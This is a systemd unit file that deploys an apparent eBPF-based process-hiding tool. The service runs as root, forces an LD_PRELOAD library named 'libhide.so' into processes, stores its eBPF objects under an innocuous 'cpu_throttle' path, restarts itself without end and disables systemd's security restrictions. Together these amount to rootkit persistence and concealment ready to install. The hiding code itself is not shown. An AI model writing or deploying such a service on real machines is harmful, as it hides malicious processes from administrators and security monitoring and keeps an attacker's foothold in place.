# hide_process_bpf/hide_process.service
[Unit]
Description=eBPF Process Hiding Service
Documentation=file:///opt/hide_process/docs/RUNTIME_DEPLOYMENT_GUIDE.md
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/opt/hide_process/bin/hide_process_loader
ExecStartPost=/bin/sleep 2
ExecStartPost=/bin/bash -c 'echo "eBPF Process Hiding loaded successfully" | systemd-cat -t hide-process'
ExecStartPost=/bin/bash -c 'ls -la /sys/fs/bpf/cpu_throttle/ | systemd-cat -t hide-process'
ExecReload=/bin/kill -HUP $MAINPID
ExecStop=/bin/bash -c 'echo "Cleaning up eBPF resources..." | systemd-cat -t hide-process'
ExecStopPost=/bin/bash -c 'rm -f /sys/fs/bpf/cpu_throttle/* 2>/dev/null || true'
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=hide-process

# Security settings
NoNewPrivileges=false
ProtectSystem=false
ProtectHome=false
PrivateTmp=true
PrivateDevices=false

# Resource limits
LimitNOFILE=65536
LimitNPROC=4096

# Working directory
WorkingDirectory=/opt/hide_process
Environment=LD_LIBRARY_PATH=/opt/hide_process/bin
Environment=LD_PRELOAD=/opt/hide_process/bin/libhide.so

[Install]
WantedBy=multi-user.target
